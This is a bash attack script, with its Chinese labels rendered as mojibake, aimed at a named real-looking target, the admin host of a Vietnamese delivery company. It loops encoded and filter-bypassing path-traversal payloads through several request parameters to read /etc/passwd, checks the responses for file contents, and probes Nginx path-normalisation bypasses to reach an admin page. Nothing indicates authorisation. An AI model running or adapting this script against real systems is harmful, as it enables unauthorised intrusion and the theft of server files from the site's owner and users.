#!/bin/bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ æ·±åº¦æ”»å‡»5ï¼šè·¯å¾„ç©¿è¶Š + æ–‡ä»¶è¯»å–"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

TARGET="admin.giaohangtietkiem.vn"

# è·¯å¾„ç©¿è¶Špayload
TRAVERSAL=(
    "../"
    "../../"
    "../../../"
    "../../../../"
    "../../../../../etc/passwd"
    "..%2f..%2f..%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
    "....//....//....//etc/passwd"
    "..;/..;/..;/etc/passwd"
)

echo "[*] æµ‹è¯•è·¯å¾„ç©¿è¶Š..."

PARAMS=("file" "path" "url" "page" "doc" "download" "export")

for param in "${PARAMS[@]}"; do
    for payload in "${TRAVERSAL[@]}"; do
        encoded=$(echo -n "$payload" | jq -sRr @uri)
        resp=$(curl -sk "https://$TARGET/api/file?${param}=${encoded}" -m 3 2>&1)
        
        if echo "$resp" | grep -qE "root:|daemon:|bin:"; then
            echo "  âœ… è·¯å¾„ç©¿è¶ŠæˆåŠŸï¼$param=$payload"
            echo "$resp" | head -10
            break 2
        fi
    done
done

echo ""
echo "[*] æµ‹è¯•Nginxé…ç½®é”™è¯¯..."
# Nginxè·¯å¾„è§„èŒƒåŒ–æ¼æ´
curl -sk "https://$TARGET/..;/admin" -I | head -10
curl -sk "https://$TARGET/%2e%2e/admin" -I | head -10

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
